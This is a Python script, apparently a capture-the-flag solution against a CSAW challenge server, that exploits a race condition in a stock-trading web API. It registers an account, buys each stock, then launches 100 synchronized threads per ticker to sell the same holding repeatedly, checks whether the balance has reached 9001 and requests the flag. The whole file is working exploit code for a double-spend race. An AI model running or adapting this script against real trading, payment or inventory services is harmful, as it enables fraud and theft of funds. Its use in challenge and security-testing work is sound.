import requests
import threading
import time
import random

BASE_URL = "http://android-dropper.csaw.io:4657"
LOGIN_URL = BASE_URL + "/login"
STOCKS_URL = BASE_URL + "/stocks"
BUY_URL = BASE_URL + "/buy"
SELL_URL = BASE_URL + "/sell"
ME_URL = BASE_URL + "/me"
FLAG_URL = BASE_URL + "/flag"
SESS = requests.Session()

USERNAME = "ctfuser" + str(random.randint(1000,9999))
PASSWORD = str(random.randint(1000000,9999999))

threads_count = 100
max_attempts = 20
timeout = 2 # Seconds to wait between buy and race-sell, adjust as needed


def register_and_login():
    SESS.get(BASE_URL + "/logout")
    resp = SESS.post(BASE_URL + "/register", json={"username": USERNAME, "password": PASSWORD})
    if resp.status_code == 200 and resp.json().get("status") == "success":
        # Registered, now log in
        resp2 = SESS.post(LOGIN_URL, json={"username": USERNAME, "password": PASSWORD})
        return resp2.status_code == 200
    else:
        # Sometimes already registered?
        resp2 = SESS.post(LOGIN_URL, json={"username": USERNAME, "password": PASSWORD})
        return resp2.status_code == 200

def get_stocks():
    r = SESS.get(STOCKS_URL)
    return r.json().get("stocks", [])

def buy_all_stocks(qty=1):
    stocks = get_stocks()
    bought = []
    for s in stocks:
        resp = SESS.post(BUY_URL, json={"stock": s["ticker"], "qty": qty})
        if resp.ok and resp.json().get('status') == 'success':
            bought.append(s["ticker"])
    return bought

def sell_race_all_stocks(tickers, qty=1):
    barrier = threading.Barrier(threads_count)
    results = []
    def do_sell(ticker):
        try:
            barrier.wait()
        except:
            pass
        try:
            res = SESS.post(SELL_URL, json={"stock": ticker, "qty": qty})
            if res.ok:
                results.append((ticker, True))
            else:
                results.append((ticker, False))
        except Exception:
            results.append((ticker, False))
    threads = []
    for ticker in tickers:
        for i in range(threads_count):
            t = threading.Thread(target=do_sell, args=(ticker,))
            t.start()
            threads.append(t)
    for t in threads:
        t.join()
    return results

def get_balance():
    r = SESS.get(ME_URL)
    if r.ok:
        return r.json().get('balance', 0)
    return 0

def try_flag():
    r = SESS.post(FLAG_URL)
    try:
        out = r.json()
        if out.get('status') == 'success' and 'flag' in out:
            print(f"FLAG: {out['flag']}")
            return out['flag']
    except:
        pass
    return None

def run_attempt():
    bought = buy_all_stocks(qty=1)
    if not bought:
        print("Could not buy stocks!")
        return False, None
    time.sleep(timeout)  # allow state to settle if race works better
    sell_race_all_stocks(bought, qty=1)
    time.sleep(1)
    bal = get_balance()
    print(f"Balance after sell race: ${bal}")
    if bal >= 9001:
        flag = try_flag()
        if flag:
            return True, flag
    return False, None

def main():
    if not register_and_login():
        print("Could not register/login!")
        return
    print(f"Logged in as {USERNAME}")
    for attempt in range(max_attempts):
        print(f"\n--- Attempt {attempt+1} ---")
        success, flag = run_attempt()
        if success:
            print("Exploit succeeded!")
            break
        else:
            time.sleep(0.5)

if __name__ == "__main__":
    main()

